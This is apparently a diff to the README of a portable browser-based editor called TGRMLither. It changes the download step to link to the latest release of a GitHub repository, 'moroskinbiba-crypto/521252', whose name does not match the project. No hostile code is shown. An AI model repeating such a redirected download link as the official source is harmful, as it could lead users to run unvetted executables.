@@ -6,7 +6,7 @@
 
 ## Download and run
 
-Download `TGRMLither-Portable-v1.2.0.zip` from **Releases** and extract it to any folder. On Windows, run `Launch-TGRMLither.bat`; on macOS/Linux, run `./Launch-TGRMLither.sh`. The launcher starts a local web server and opens the editor in your default browser. Python 3 is required for the launcher; if it is unavailable, open `index.html` directly (some browser storage/offline features can vary with file URLs).
+Download the latest `TGRMLither-Portable` ZIP from [Releases](https://github.com/moroskinbiba-crypto/521252/releases/latest) and extract it to any folder. On Windows, run `Launch-TGRMLither.bat`; on macOS/Linux, run `./Launch-TGRMLither.sh`. The launcher starts a local web server and opens the editor in your default browser. Python 3 is required for the launcher; if it is unavailable, open `index.html` directly (some browser storage/offline features can vary with file URLs).
 
 No installer, account, or backend is required. Image processing takes place in the browser. Web fonts are fetched from Google Fonts when online; offline use falls back to fonts installed on your system.
 
